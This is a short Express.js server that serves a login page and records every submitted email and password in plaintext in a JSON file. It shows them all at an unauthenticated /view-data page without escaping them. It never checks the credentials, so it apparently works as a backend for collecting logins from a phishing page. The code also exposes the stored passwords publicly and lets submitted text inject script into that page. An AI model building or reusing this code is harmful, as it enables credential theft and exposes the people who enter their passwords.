const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serve static files from the "public" folder

// Serve the login page at the root ("/")
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));  // Adjust this path to your HTML file
});

// Handle login POST request
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Load existing data
    const filePath = path.join(__dirname, 'data.json');
    let data = [];

    try {
        if (fs.existsSync(filePath)) {
            const fileData = fs.readFileSync(filePath, 'utf8');
            data = JSON.parse(fileData);
        }
    } catch (err) {
        console.error('Error reading the file:', err);
        return res.status(500).json({ message: 'Internal Server Error' });
    }

    // Add new login data
    data.push({ email, password });

    try {
        // Save updated data
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        res.json({ message: 'Login data stored successfully!' });
    } catch (err) {
        console.error('Error writing to the file:', err);
        return res.status(500).json({ message: 'Error saving login data' });
    }
});

// ✅ NEW: View login data in a table
app.get('/view-data', (req, res) => {
    const filePath = path.join(__dirname, 'data.json');

    if (!fs.existsSync(filePath)) {
        return res.send('<p>No data found yet.</p>');
    }

    let data = [];
    try {
        const fileData = fs.readFileSync(filePath, 'utf8');
        data = JSON.parse(fileData);
    } catch (err) {
        console.error('Error reading the file:', err);
        return res.status(500).json({ message: 'Error reading login data' });
    }

    const rows = data.map(d => `<tr><td>${d.email}</td><td>${d.password}</td></tr>`).join('');

    const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Login Data</title>
      <style>
        body { font-family: sans-serif; padding: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ccc; padding: 10px; }
        th { background-color: #f2f2f2; }
      </style>
    </head>
    <body>
      <h2>Stored Login Data</h2>
      <table>
        <thead><tr><th>Email</th><th>Password</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </body>
    </html>
    `;

    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
